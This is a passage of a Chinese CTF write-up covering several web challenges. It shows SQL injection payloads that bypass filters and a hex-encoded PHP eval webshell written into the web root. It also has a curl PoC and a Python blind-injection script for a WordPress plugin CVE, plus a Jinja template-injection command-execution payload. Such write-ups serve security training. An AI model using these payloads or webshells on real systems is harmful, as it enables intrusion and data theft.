class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>length(database())=3<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>&#x27;<br><br>id=0&#x27;<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>ascii(substr((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">129</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-symbol">`1`</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>ccctttfff)a),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">1</span>;%00<br><br>id=0&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats;%00<br><br>id=0&#x27;<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(group_concat(<span class="hljs-symbol">`3`</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag)a);%00<br></code></pre></td></tr></table></figure><p>查找出的数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">database=ctf,ctftraining,ctftraining,ctftraining,mysql</span> <br><span class="hljs-meta prompt_">#</span><span class="language-bash">version=10.4.13-MariaDB</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">table_name=ccctttfff,flag,news,<span class="hljs-built_in">users</span>,gtid_slave_pos</span><br></code></pre></td></tr></table></figure><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>一直查到flag表，发现好像没有数据，后来才发现是在另一个库</p><p>最终payload：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=0&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-symbol">`1`</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>ctftraining.flag)a);%00<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200667.png" alt="image-20221006162659238"></p><h3 id="曲折过程"><a href="#曲折过程" class="headerlink" title="曲折过程"></a>曲折过程</h3><p>谢天谢地mysql的读写权限没有关闭。</p><p>查看一下index.php</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">id=<span class="hljs-number">0</span>&#x27;union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select<span class="hljs-comment">/**/</span>load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">index</span>.<span class="hljs-params">php</span>&#x27;)</span>);%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <span class="hljs-keyword">exit</span>();<br><br><br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$flag</span>=<span class="hljs-number">1</span>;<br><br><span class="hljs-variable">$db</span>=<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>==<span class="hljs-literal">false</span>) <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;数据库连接失败！&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$name</span>==<span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;p&gt;请输入完整登录信息&lt;/p&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/and|sleep|extractvalue|information|is|not|updataxml|order|rand|handler|sleep|\~|\!|\@|\#|\\$|\%|\^|\+|\&amp;|\-|\ /i&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;select id,uname,infor from ccctttfff where id = &#x27;<span class="hljs-subst">$name</span>&#x27;&quot;</span>;<br><span class="hljs-comment">#echo $query;</span><br>    @<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$db</span>,<span class="hljs-variable">$query</span>);<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$data</span>=@<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>        <br>            <span class="hljs-variable">$flag</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Here is your want!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">print</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;infor&#x27;</span>]);<br>            <br>        <br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag</span>)&#123;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;p&gt;姓名不存在，或账号密码错误&lt;/p&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>写入shell</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">0&#x27;u</span>nion<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x3c3f70687020406576616c28245f4745545b315d293b3f3e</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">into</span><span class="hljs-comment">/**/</span>outfile<span class="hljs-comment">/**/</span><span class="hljs-string">&quot;/var/www/html/hah.php&quot;</span>;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>写一个去掉过滤的fake.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <span class="hljs-keyword">exit</span>();<br><br><br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$flag</span>=<span class="hljs-number">1</span>;<br><br><span class="hljs-variable">$db</span>=<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>==<span class="hljs-literal">false</span>) <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;数据库连接失败！&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$name</span>==<span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;p&gt;请输入完整登录信息&lt;/p&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;select id,uname,infor from ccctttfff where id = &#x27;<span class="hljs-subst">$name</span>&#x27;&quot;</span>;<br><span class="hljs-comment">#echo $query;</span><br>    @<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$db</span>,<span class="hljs-variable">$query</span>);<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$data</span>=@<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>        <br>            <span class="hljs-variable">$flag</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Here is your want!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">print</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;infor&#x27;</span>]);<br>            <br>        <br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag</span>)&#123;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;p&gt;姓名不存在，或账号密码错误&lt;/p&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后写入&#x2F;var&#x2F;www&#x2F;html即可，接着就可以没有过滤的sql注入了。</p><p>联合查询查，这里可以用information_schema了，可查列名</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">0&#x27;u</span>nion <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctf&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>后来发现flag表不在ctf库里</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">0&#x27;u</span>nion <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span><span class="hljs-meta">#</span><br><br>id=<span class="hljs-number">0&#x27;u</span>nion <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag) <span class="hljs-keyword">from</span> ctftraining.flag<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200493.png" alt="image-20221006160938289"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">0&#x27;u</span>nion <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201399.png" alt="image-20221006160950074"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">0</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag) from ctftraining.flag#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201914.png" alt="image-20221006163557013"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>问题出在</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">id=<span class="hljs-number">0&#x27;u</span>nion<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>没有指定数据库，所以我下意识以为flag在ctf库内。</p><h2 id="WEEK2-ohmywordpress"><a href="#WEEK2-ohmywordpress" class="headerlink" title="[WEEK2]ohmywordpress"></a>[WEEK2]ohmywordpress</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201790.png" alt="image-20221010195959792"></p><p>通过version.php得知</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$wp_version</span> = <span class="hljs-string">&#x27;6.0.2&#x27;</span>;<br></code></pre></td></tr></table></figure><p>搜了一下，这是当前最新的版本，目前好像还没有爆出漏洞。所以问题大概率不出现在cms本身上，可能是在插件上。</p><p>查看wordpress\wp-content\plugins有哪些插件</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201612.png" alt="image-20221010195343752"></p><p>两个插件，akismet和simple-link-directory</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">akismet</span>  <span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">simple</span>-link-directory  <span class="hljs-number">7</span>.<span class="hljs-number">7</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>akismet 当前版本好像没啥问题，只搜到一个3.1.5之前版本中存在跨站脚本漏洞。</p><p>凑巧的是simple-link-directory</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201503.png" alt="image-20221010195715553"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">CVE</span><span class="hljs-params">(CAN)</span></span> ID: CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">0760</span><br></code></pre></td></tr></table></figure><p><a href="https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210">简单链接目录 &lt; 7.7.2 - 未经身份验证的 SQL 注入 WordPress 安全漏洞 (wpscan.com)</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7</span>.<span class="hljs-number">7</span>.<span class="hljs-number">2</span> 之前的简单链接目录 WordPress 插件在通过qcopd_upvote_action AJAX 操作（可用于未经身份验证和身份验证的用户）在 SQL 语句中使用post_id参数之前，不会对其进行验证和转义，从而导致未经身份验证的 SQL 注入<br></code></pre></td></tr></table></figure><p>题目给出的版本在7.7.1，有文章明确提出最高危及到7.7.1，所以当前版本是存在SQL注入的。</p><p>这篇报告中给出了poc</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">curl</span> <span class="hljs-string">&#x27;http://example.com/wp-admin/admin-ajax.php&#x27;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&#x27;action=qcopd_upvote_action&amp;post_id=(SELECT 3 FROM (SELECT SLEEP(5))enz)&#x27;</span> <br></code></pre></td></tr></table></figure><p>接着咱们构造</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">GET</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://</span><span class="hljs-number">1.14</span>.<span class="hljs-number">71.254</span><span class="hljs-symbol">:</span><span class="hljs-number">28785</span>/wp-admin/admin-ajax.php<br><span class="hljs-variable constant_">POST</span><span class="hljs-symbol">:action=qcopd_upvote_action&amp;post_id=</span>(<span class="hljs-variable constant_">SELECT</span> <span class="hljs-number">3</span> <span class="hljs-variable constant_">FROM</span> (<span class="hljs-variable constant_">SELECT</span> <span class="hljs-variable constant_">SLEEP</span>(<span class="hljs-number">5</span>))enz)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201965.png" alt="image-20221010200102507"></p><p>确实存在漏洞。</p><p>接着开始时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>burp0_url = <span class="hljs-string">&quot;http://1.14.71.254:28785/wp-admin/admin-ajax.php&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://1.14.71.254:28432/wp-admin/admin-ajax.php&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://1.14.71.254:28432&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>result=<span class="hljs-string">&quot;&quot;</span><br>dic=<span class="hljs-string">&quot;,abcdefghijklmnopqrstuvwxyz_&#123;-1234567890&#125;NSSCTF&quot;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">150</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>payload=<span class="hljs-string">&quot;(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(flag) from ctftraining.flag),%d,1))=%d),sleep(1),0))a)&quot;</span>%(i,<span class="hljs-built_in">ord</span>(j))<br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x637466747261696e696e67),%d,1))=%d),sleep(1),0))a)&quot;%(i,ord(j))</span><br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x637466747261696e696e67),%d,1))=%d),sleep(1),0))a)&quot;%(i,ord(j))</span><br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))=%d),sleep(1),0))a)&quot;%(i,ord(j))</span><br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x77705f7573657273),%d,1))=%d),sleep(1),0))a)&quot;%(i,ord(j))</span><br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((ascii(substr(version(),%d,1))=%d),sleep(1),0))a)&quot;%(i,j)</span><br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((length(database())=%d),sleep(1),1))hh)&quot;%i</span><br>burp0_data = &#123;<span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;qcopd_upvote_action&quot;</span>, <span class="hljs-string">&quot;post_id&quot;</span>:payload&#125;<br>t1=time.time()<br>re=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)<br>time.sleep(<span class="hljs-number">0.1</span>)<br>t2=time.time()<br><span class="hljs-keyword">if</span> t2-t1 &gt; <span class="hljs-number">1</span> :<br>result+=j<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-keyword">break</span><br><span class="hljs-comment">#database:information_schema,mysql,ctftraining,</span><br><span class="hljs-comment">#version: &quot;10.4.13-MariDB&quot;</span><br><span class="hljs-comment">#flag,news,users</span><br><span class="hljs-comment">#table name:wp_commentmeta,wp_commenjs,wp_links,wp_options,wp_postmeta,wp_posts,wp_term_relationships,wp_term_taxonomy,wp_termmeta,wp_termsbwp_usermeta,wp_users</span><br><span class="hljs-comment">#column name:user_login,user_pass,user_nicename,bser_email,user_url,user_registered,user_activation_key,useq_status,display_name</span><br><span class="hljs-comment">#action=qcopd_upvote_action&amp;post_id=(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),1,1))&gt;127),sleep(1),0))a)</span><br><span class="hljs-comment">#(SELECT 1 FROM (SELECT if((ascii(substr(database(),1,1))&gt;32),sleep(1),0))a)</span><br><span class="hljs-comment">#(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),1,1))&gt;127),sleep(1),0))a)</span><br><span class="hljs-comment">#action=qcopd_upvote_action&amp;post_id=(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x77705f7573657273),1,1))&gt;32),sleep(1),0))a)</span><br><span class="hljs-comment">#NSSCTF&#123;dd697eee-746a-4cd7-ae2e-bc6c1827ec08&#125;  </span><br><span class="hljs-comment">#NSSCTF&#123;dd697eee-749a-4cd7-ae2e-bc6c1827ecs8&#125;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#NSSCTF&#123;dd697eee-749a-4cd7-ae2e-bc6c1827ec08&#125;</span><br></code></pre></td></tr></table></figure><h2 id="WEEK3-ssssti"><a href="#WEEK3-ssssti" class="headerlink" title="[WEEK3]ssssti"></a>[WEEK3]ssssti</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GET:?name=&#123;&#123;()[request.cookies.x1][request.cookies.x2][request.cookies.x3]()[127][request.cookies.x4][request.cookies.x5][request.cookies.x6][request.cookies.x7](request.cookies.x8)&#125;&#125;<br><br>Cookie: <span class="hljs-attribute">x1</span>=__class__; <span class="hljs-attribute">x2</span>=__base__; <span class="hljs-attribute">x3</span>=__subclasses__; <span class="hljs-attribute">x4</span>=__init__; <span class="hljs-attribute">x5</span>=__globals__; <span class="hljs-attribute">x6</span>=__builtins__; <span class="hljs-attribute">x7</span>=eval; <span class="hljs-attribute">x8</span>=__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211021044329.png" alt="image-20221019233832029"></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211021044935.png" alt="image-20221019233926186"></p><h2 id="WEEK3-QAQ-1inclu4e"><a href="#WEEK3-QAQ-1inclu4e" class="headerlink" title="[WEEK3]QAQ_1inclu4e"></a>[WEEK3]QAQ_1inclu4e</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211021044268.png" alt="image-20221024120859858"></p><p>include QAQ(参数)，关键字过滤了</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">php  <span class="hljs-keyword">data</span> . flag <span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>需要用到条件竞争，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 